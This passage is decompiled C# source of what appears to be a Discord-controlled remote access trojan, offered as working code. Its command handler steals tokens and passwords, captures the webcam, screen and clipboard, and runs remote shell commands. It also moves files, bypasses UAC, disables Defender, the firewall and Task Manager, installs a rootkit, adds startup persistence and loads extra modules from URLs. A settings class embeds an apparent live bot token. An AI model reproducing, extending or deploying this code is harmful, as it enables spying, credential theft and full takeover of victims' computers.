			await Send_attachment(channelid, "", new List<byte[]> { StringToBytes(text) }, new string[1] { "help.txt" });
			await Send_message(channelid, "Command executed!");
		}
		else
		{
			await Send_message(channelid, "```" + text + "```");
			await Send_message(channelid, "Command executed!");
		}
	}

	public static async Task webcampic(string channelid)
	{
		if (!dll_holder.ContainsKey("webcam"))
		{
			await LoadDll("webcam", await LinkToBytes(dll_url_holder["webcam"]));
		}
		if (!activator_holder.ContainsKey("webcam"))
		{
			activator_holder["webcam"] = Activator.CreateInstance(dll_holder["webcam"].GetType("Webcam.webcam"));
			activator_holder["webcam"].GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[0]);
		}
		object obj = activator_holder["webcam"];
		obj.GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[0]);
		if ((obj.GetType().GetField("cameras").GetValue(obj) as IDictionary<int, string>).Count < 1)
		{
			await Send_message(channelid, "No cameras found!");
			await Send_message(channelid, "Command executed!");
			return;
		}
		try
		{
			byte[] item = (byte[])obj.GetType().GetMethod("GetImage").Invoke(obj, new object[0]);
			await Send_attachment(channelid, "", new List<byte[]> { item }, new string[1] { "webcam.jpg" });
			await Send_message(channelid, "Command executed!");
		}
		catch
		{
			await Send_message(channelid, "Error taking picture!");
			await Send_message(channelid, "Command executed!");
		}
	}

	public static async Task select_cam(string channelid, string number)
	{
		if (!dll_holder.ContainsKey("webcam"))
		{
			await LoadDll("webcam", await LinkToBytes(dll_url_holder["webcam"]));
		}
		if (!activator_holder.ContainsKey("webcam"))
		{
			activator_holder["webcam"] = Activator.CreateInstance(dll_holder["webcam"].GetType("Webcam.webcam"));
			activator_holder["webcam"].GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[0]);
		}
		int selection;
		try
		{
			selection = int.Parse(number);
		}
		catch
		{
			await Send_message(channelid, "Error that is not a number!");
			return;
		}
		object obj2 = activator_holder["webcam"];
		if ((bool)obj2.GetType().GetMethod("select").Invoke(obj2, new object[1] { selection }))
		{
			await Send_message(channelid, "Selected onto camera " + selection);
		}
		else
		{
			await Send_message(channelid, "Error that is a invalid selection!");
		}
		await Send_message(channelid, "Command executed!");
	}

	public static async Task get_cams(string channelid)
	{
		if (!dll_holder.ContainsKey("webcam"))
		{
			await LoadDll("webcam", await LinkToBytes(dll_url_holder["webcam"]));
		}
		if (!activator_holder.ContainsKey("webcam"))
		{
			activator_holder["webcam"] = Activator.CreateInstance(dll_holder["webcam"].GetType("Webcam.webcam"));
			activator_holder["webcam"].GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[0]);
		}
		object obj = activator_holder["webcam"];
		if ((obj.GetType().GetField("cameras").GetValue(obj) as IDictionary<int, string>).Count < 1)
		{
			await Send_message(channelid, "No cameras found!");
			await Send_message(channelid, "Command executed!");
			return;
		}
		string text = (string)obj.GetType().GetMethod("GetWebcams").Invoke(obj, new object[0]);
		if (text.Length >= 1990)
		{
			await Send_attachment(channelid, "", new List<byte[]> { StringToBytes(text) }, new string[1] { "webcams.txt" });
			await Send_message(channelid, "Command executed!");
		}
		else
		{
			await Send_message(channelid, "```" + text + "```");
			await Send_message(channelid, "Command executed!");
		}
	}

	public static async Task get_tokens(string channelid)
	{
		if (!dll_holder.ContainsKey("token"))
		{
			await LoadDll("token", await LinkToBytes(dll_url_holder["token"]));
		}
		if (!activator_holder.ContainsKey("token"))
		{
			activator_holder["token"] = Activator.CreateInstance(dll_holder["token"].GetType("Token_grabber.grabber"));
		}
		object obj = activator_holder["token"];
		List<string> values = (List<string>)obj.GetType().GetMethod("grab").Invoke(obj, new object[0]);
		string text = string.Join("\n\n", values);
		if (text.Length >= 1990)
		{
			await Send_attachment(channelid, "", new List<byte[]> { StringToBytes(text) }, new string[1] { "tokens.txt" });
			await Send_message(channelid, "Command executed!");
		}
		else
		{
			await Send_message(channelid, "```" + text + "```");
			await Send_message(channelid, "Command executed!");
		}
	}

	public static async Task CommandHandler(string message_content, string[] attachment_urls)
	{
		if (!message_content.StartsWith("!"))
		{
			return;
		}
		string text = message_content.Split(" ".ToCharArray())[0];
		string message_data = string.Join(" ", message_content.Split(" ".ToCharArray()).Skip(1));
		switch (text)
		{
		case "!grabtokens":
			await get_tokens(ChannelId);
			break;
		case "!getcams":
			await get_cams(ChannelId);
			break;
		case "!selectcam":
			await select_cam(ChannelId, message_data);
			break;
		case "!webcampic":
			await webcampic(ChannelId);
			break;
		case "!message":
			MessageBox.Show(message_data);
			break;
		case "!shell":
			await Task.Factory.StartNew(() => ShellCommand(message_data, ChannelId));
			break;
		case "!voice":
			await Speak(ChannelId, message_data);
			break;
		case "!admincheck":
			await Send_message(ChannelId, new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString());
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!cd":
			Directory.SetCurrentDirectory(message_data);
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!dir":
			await dir(ChannelId);
			break;
		case "!download":
			await upload(ChannelId, message_data);
			break;
		case "!upload":
			if (attachment_urls.Length != 0)
			{
				try
				{
					string channelId = message_data;
					File.WriteAllBytes(channelId, await LinkToBytes(attachment_urls[0]));
					await Send_message(ChannelId, "Command executed!");
					break;
				}
				catch
				{
					await Send_message(ChannelId, "Error writing file!");
					break;
				}
			}
			await Send_message(ChannelId, "Could not find attachment!");
			break;
		case "!uploadlink":
			if (message_data.Split(" ".ToCharArray()).Length > 1)
			{
				try
				{
					string channelId = message_data.Split(" ".ToCharArray())[0];
					File.WriteAllBytes(channelId, await LinkToBytes(message_data.Split(" ".ToCharArray())[1]));
					await Send_message(ChannelId, "Command executed!");
					break;
				}
				catch
				{
					await Send_message(ChannelId, "Error writing file!");
					break;
				}
			}
			await Send_message(ChannelId, "Could not find filename or link!");
			break;
		case "!delete":
			if (message_data != null && message_data != "")
			{
				try
				{
					File.Delete(message_data);
					await Send_message(ChannelId, "Command executed!");
					break;
				}
				catch
				{
					await Send_message(ChannelId, "Error deleting file!");
					break;
				}
			}
			await Send_message(ChannelId, "Could not find filename!");
			break;
		case "!write":
			SendKeys.SendWait(message_data);
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!wallpaper":
			if (attachment_urls.Length != 0)
			{
				string channelId = ChannelId;
				await BytesToWallpaper(channelId, await LinkToBytes(attachment_urls[0]));
			}
			else
			{
				await Send_message(ChannelId, "Could not find attachment!");
			}
			break;
		case "!clipboard":
			await GetClipboard(ChannelId);
			break;
		case "!idletime":
			await Send_message(ChannelId, (GetIdleTime() / 1000u).ToString());
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!currentdir":
			await Send_message(ChannelId, Directory.GetCurrentDirectory());
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!block":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				BlockInput(fBlockIt: true);
				await Send_message(ChannelId, "Command executed!");
			}
			else
			{
				await Send_message(ChannelId, "You dont have admin!");
			}
			break;
		case "!unblock":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				BlockInput(fBlockIt: false);
				await Send_message(ChannelId, "Command executed!");
			}
			else
			{
				await Send_message(ChannelId, "You dont have admin!");
			}
			break;
		case "!screenshot":
			await GetScreenshot(ChannelId);
			break;
		case "!exit":
			Application.Exit();
			Environment.Exit(0);
			break;
		case "!kill":
			await Kill(message_data);
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!uacbypass":
			await uacbypass(Assembly.GetEntryAssembly().Location, ChannelId);
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!shutdown":
			Process.Start("shutdown", "/s /t 0");
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!restart":
			Process.Start("shutdown", "/r /t 0");
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!logoff":
			Process.Start("shutdown", "/L");
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!bluescreen":
			Bluescreen();
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!datetime":
			await Send_message(ChannelId, DateTime.Now.ToString("MM\\/dd\\/yyyy h\\:mm tt"));
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!prockill":
			await ProcKill(ChannelId, message_data);
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!disabledefender":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				await DisableDefender(ChannelId);
			}
			else
			{
				await Send_message(ChannelId, "You dont have admin!");
			}
			break;
		case "!disablefirewall":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				await DisableFirewall(ChannelId);
			}
			else
			{
				await Send_message(ChannelId, "You dont have admin!");
			}
			break;
		case "!audio":
			if (attachment_urls.Length != 0)
			{
				string channelId = ChannelId;
				await PlayAudio(channelId, await LinkToBytes(attachment_urls[0]));
			}
			else
			{
				await Send_message(ChannelId, "Could not find attachment!");
			}
			break;
		case "!critproc":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				critproc();
				await Send_message(ChannelId, "Command executed!");
			}
			else
			{
				await Send_message(ChannelId, "You dont have admin!");
			}
			break;
		case "!uncritproc":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				uncritproc();
				await Send_message(ChannelId, "Command executed!");
			}
			else
			{
				await Send_message(ChannelId, "You dont have admin!");
			}
			break;
		case "!website":
			Process.Start(message_data);
			await Send_message(ChannelId, "Command executed!");
			break;
		case "!disabletaskmgr":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				DisableTaskManager();
				await Send_message(ChannelId, "Command executed!");
			}
			else
			{
				await Send_message(ChannelId, "You dont have admin!");
			}
			break;
		case "!enabletaskmgr":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				EnableTaskManager();
				await Send_message(ChannelId, "Command executed!");
			}
			else
			{
				await Send_message(ChannelId, "You dont have admin!");
			}
			break;
		case "!startup":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				addstartupadmin();
				await Send_message(ChannelId, "Command executed!");
			}
			else
			{
				addstartupnonadmin();
				await Send_message(ChannelId, "Command executed!");
			}
			break;
		case "!geolocate":
		{
			string channelId = ChannelId;
			await Send_message(channelId, await geolocate());
			await Send_message(ChannelId, "Command executed!");
			break;
		}
		case "!listprocess":
			await getprocs(ChannelId);
			break;
		case "!password":
			await sendpassword(ChannelId);
			break;
		case "!rootkit":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				await Rootkit(ChannelId);
			}
			else
			{
				await Send_message(ChannelId, "You dont have admin!");
			}
			break;
		case "!unrootkit":
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				await UnRootkit(ChannelId);
			}
			else
			{
				await Send_message(ChannelId, "You dont have admin!");
			}
			break;
		case "!help":
			await helpmenu(ChannelId);
			break;
		}
	}
}
internal class settings
{
	public static string Bottoken = "MTQ0NjcwMzI2MTYxMTQ2Mjc4Nw.G_TIHk.XfR5f_zHADhnTpTholnR1qTGDmbEBD6bjymwL0";

	public static string Guildid = "1361948876130619604";
}
